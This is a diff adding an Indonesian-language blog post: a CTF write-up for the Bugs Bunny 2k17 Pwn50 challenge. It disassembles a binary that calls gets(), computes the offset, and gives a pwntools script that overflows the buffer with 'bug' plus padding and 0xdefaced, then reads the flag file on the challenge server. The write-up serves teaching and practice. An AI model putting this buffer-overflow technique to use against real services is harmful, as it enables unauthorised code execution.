@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Bugs Bunny 2k17 CTF - Pwn50 :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Diberikan file ELF binary bernama pwn50 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn50 pwn50: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9100876ac8da789151a1afcbc3e43ddaca1305c1, not stripped Binary ini hanya meminta user input tanpa mengirim kembali outputnya
+➜ ./pwn50 saya ganteng Dengan menggunakan nm terlihat bahwa binary tersebut menggunakan fungsi gets() yang tidak membatasi user input sehingga dapat menyebabkan Buffer Overflow."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/post/2017-06-22-bugs-bunny2k17-pwn50/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bugs Bunny 2k17 CTF - Pwn50"/>
+<meta name="twitter:description" content="Diberikan file ELF binary bernama pwn50 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn50 pwn50: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9100876ac8da789151a1afcbc3e43ddaca1305c1, not stripped Binary ini hanya meminta user input tanpa mengirim kembali outputnya
+➜ ./pwn50 saya ganteng Dengan menggunakan nm terlihat bahwa binary tersebut menggunakan fungsi gets() yang tidak membatasi user input sehingga dapat menyebabkan Buffer Overflow."/>
+
+
+
+<meta property="og:title" content="Bugs Bunny 2k17 CTF - Pwn50" />
+<meta property="og:description" content="Diberikan file ELF binary bernama pwn50 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn50 pwn50: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9100876ac8da789151a1afcbc3e43ddaca1305c1, not stripped Binary ini hanya meminta user input tanpa mengirim kembali outputnya
+➜ ./pwn50 saya ganteng Dengan menggunakan nm terlihat bahwa binary tersebut menggunakan fungsi gets() yang tidak membatasi user input sehingga dapat menyebabkan Buffer Overflow." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/2017-06-22-bugs-bunny2k17-pwn50/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/post/2017-06-22-bugs-bunny2k17-pwn50/">Bugs Bunny 2k17 CTF - Pwn50</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by Aiden Pearce</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/bugs-bunny2k17/">bugs-bunny2k17</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/ctf.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <p>Diberikan file ELF binary bernama pwn50 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  file pwn50
+pwn50: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>9100876ac8da789151a1afcbc3e43ddaca1305c1, not stripped
+</code></pre></div><p>Binary ini hanya meminta user input tanpa mengirim kembali outputnya</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  ./pwn50
+saya ganteng
+</code></pre></div><p>Dengan menggunakan <code>nm</code> terlihat bahwa binary tersebut menggunakan fungsi <code>gets()</code> yang tidak membatasi user input sehingga dapat menyebabkan <em>Buffer Overflow</em>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  nm -D pwn50
+                 U geteuid
+                 U gets
+                 w __gmon_start__
+                 U __libc_start_main
+                 U puts
+                 U setreuid
+                 U system
+</code></pre></div><p>Berikut hasil disassembly menggunakan <code>gdb peda</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ pdisass main
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+   0x0000000000400646 &lt;+0&gt;:	push   rbp
+   0x0000000000400647 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040064a &lt;+4&gt;:	push   rbx
+   0x000000000040064b &lt;+5&gt;:	sub    rsp,0x38
+   0x000000000040064f &lt;+9&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x34<span style="color:#f92672">]</span>,edi
+   0x0000000000400652 &lt;+12&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x40<span style="color:#f92672">]</span>,rsi
+   0x0000000000400656 &lt;+16&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x18<span style="color:#f92672">]</span>,0x0
+   0x000000000040065e &lt;+24&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x30<span style="color:#f92672">]</span>
+   0x0000000000400662 &lt;+28&gt;:	mov    rdi,rax
+   0x0000000000400665 &lt;+31&gt;:	mov    eax,0x0
+   0x000000000040066a &lt;+36&gt;:	call   0x400520 &lt;gets@plt&gt;
+   0x000000000040066f &lt;+41&gt;:	movzx  eax,BYTE PTR <span style="color:#f92672">[</span>rbp-0x30<span style="color:#f92672">]</span>
+   0x0000000000400673 &lt;+45&gt;:	cmp    al,0x62
+   0x0000000000400675 &lt;+47&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x0000000000400677 &lt;+49&gt;:	movzx  eax,BYTE PTR <span style="color:#f92672">[</span>rbp-0x2f<span style="color:#f92672">]</span>
+   0x000000000040067b &lt;+53&gt;:	cmp    al,0x75
+   0x000000000040067d &lt;+55&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x000000000040067f &lt;+57&gt;:	movzx  eax,BYTE PTR <span style="color:#f92672">[</span>rbp-0x2e<span style="color:#f92672">]</span>
+   0x0000000000400683 &lt;+61&gt;:	cmp    al,0x67
+   0x0000000000400685 &lt;+63&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x0000000000400687 &lt;+65&gt;:	cmp    QWORD PTR <span style="color:#f92672">[</span>rbp-0x18<span style="color:#f92672">]</span>,0xdefaced
+   0x000000000040068f &lt;+73&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x0000000000400691 &lt;+75&gt;:	mov    edi,0x400764
+   0x0000000000400696 &lt;+80&gt;:	call   0x4004e0 &lt;puts@plt&gt;
+   0x000000000040069b &lt;+85&gt;:	mov    eax,0x0
+   0x00000000004006a0 &lt;+90&gt;:	call   0x400500 &lt;geteuid@plt&gt;
+   0x00000000004006a5 &lt;+95&gt;:	mov    ebx,eax
+   0x00000000004006a7 &lt;+97&gt;:	mov    eax,0x0
+   0x00000000004006ac &lt;+102&gt;:	call   0x400500 &lt;geteuid@plt&gt;
+   0x00000000004006b1 &lt;+107&gt;:	mov    esi,ebx
+   0x00000000004006b3 &lt;+109&gt;:	mov    edi,eax
+   0x00000000004006b5 &lt;+111&gt;:	mov    eax,0x0
+   0x00000000004006ba &lt;+116&gt;:	call   0x400530 &lt;setreuid@plt&gt;
+   0x00000000004006bf &lt;+121&gt;:	mov    edi,0x400773
+   0x00000000004006c4 &lt;+126&gt;:	mov    eax,0x0
+   0x00000000004006c9 &lt;+131&gt;:	call   0x4004f0 &lt;system@plt&gt;
+   0x00000000004006ce &lt;+136&gt;:	mov    eax,0x0
+   0x00000000004006d3 &lt;+141&gt;:	add    rsp,0x38
+   0x00000000004006d7 &lt;+145&gt;:	pop    rbx
+   0x00000000004006d8 &lt;+146&gt;:	pop    rbp
+   0x00000000004006d9 &lt;+147&gt;:	ret    
+End of assembler dump.
+</code></pre></div><p>Terdapat local variable yang terletak di <code>rbp-0x18</code> diinisialisasi dengan nilai 0x00</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> 0x0000000000400656 &lt;+16&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x18<span style="color:#f92672">]</span>,0x0
+</code></pre></div><p>User input akan disimpan di <code>rbp-0x30</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   0x000000000040065e &lt;+24&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x30<span style="color:#f92672">]</span>
+   0x0000000000400662 &lt;+28&gt;:	mov    rdi,rax
+   0x0000000000400665 &lt;+31&gt;:	mov    eax,0x0
+   0x000000000040066a &lt;+36&gt;:	call   0x400520 &lt;gets@plt&gt;
+</code></pre></div><p>Selain itu terdapat perbandingan <code>(cmp)</code> yang dimana membandingkan 3 karakter pertama dari user input <code>al dengan 0x62,0x75,dan 0x67</code>. Apabila <code>0x62,0x75,dan 0x67</code> di convert ke ascii menghasilkan <code>bug</code>
+Berikut nya terdapat perbandingan antara local variable di <code>rbp-0x18</code> dengan <code>0xdefaced</code> atau <code>233811181</code> dalam desimal.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   0x0000000000400673 &lt;+45&gt;:	cmp    al,0x62
+   0x0000000000400675 &lt;+47&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x0000000000400677 &lt;+49&gt;:	movzx  eax,BYTE PTR <span style="color:#f92672">[</span>rbp-0x2f<span style="color:#f92672">]</span>
+   0x000000000040067b &lt;+53&gt;:	cmp    al,0x75
+   0x000000000040067d &lt;+55&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x000000000040067f &lt;+57&gt;:	movzx  eax,BYTE PTR <span style="color:#f92672">[</span>rbp-0x2e<span style="color:#f92672">]</span>
+   0x0000000000400683 &lt;+61&gt;:	cmp    al,0x67
+   0x0000000000400685 &lt;+63&gt;:	jne    0x4006ce &lt;main+136&gt;
+   0x0000000000400687 &lt;+65&gt;:	cmp    QWORD PTR <span style="color:#f92672">[</span>rbp-0x18<span style="color:#f92672">]</span>,0xdefaced
+</code></pre></div><p>Semua perbandingan diatas harus bernilai benar agar bisa mendapatkan flag, apabila tidak akan arahkan ke <code>0x00000000004006ce</code> atau program akan <code>exit(0)</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> 0x00000000004006ce &lt;+136&gt;:	mov    eax,0x0
+</code></pre></div><p>Tujuan kita adalah mengganti nilai 0x0 pada local variable yang terletak di <code>rbp-0x18</code> dengan nilai <code>0xdefaced</code> agar bisa mendapatkan flag.</p>
+<p>Cara merubah nilai local variable tersebut sangat mudah, kita bisa menggunakan gdb.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ b *main
+Breakpoint <span style="color:#ae81ff">1</span> at 0x400646
+gdb-peda$ r
+gdb-peda$ x/x $rbp-0x30
+0x4006b0 &lt;main+106&gt;:	0x0000b8c789de89ff
+gdb-peda$ x/x $rbp-0x18
+0x4006c8 &lt;main+130&gt;:	0x00b8fffffe22e800
+</code></pre></div><p>Sehingga didapatkan alamat dari <code>$rbp-0x30</code> adalah <code>0x4006b0</code> dan <code>$rbp-0x18</code> adalah <code>0x4006c8</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;&gt;&gt; 0x4006b0-0x4006c8
+-24
+</code></pre></div><p>Dari hasil pengurangan tersebut, dibutuhkan 24 bytes untuk melakukan <em>overwrite</em> terdhap nilai local variable <code>$rbp-0x18</code></p>
+<p>Penyusanan payloadnya seperti berikut.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bug + <span style="color:#f92672">(</span>A * 21<span style="color:#f92672">)</span> + 0xdefaced
+</code></pre></div><p>Disini saya menggunakan <code>pwntools</code> untuk membuat exploitnya</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;54.67.102.66&#34;</span>,<span style="color:#ae81ff">5251</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bug&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">21</span>
+correct_value <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdefaced</span>)
+payload_to_send <span style="color:#f92672">=</span> payload<span style="color:#f92672">+</span>correct_value
+r<span style="color:#f92672">.</span>sendline(payload_to_send)
+r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat /home/pwn50/flag&#34;</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Your Flag:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#34;Bugs_Bunny&#34;</span>))
+</code></pre></div><p>Setelah script exploit dijalankan akan mendaptkan flag.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/post/2017-07-22-bugs-bunny2k17-pwn150/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Bugs Bunny 2k17 CTF - Pwn150</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/post/2017-06-22-bugs-bunny2k17-rev75/">
+                  <span class="button__text">Bugs Bunny 2k17 CTF - Rev75</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
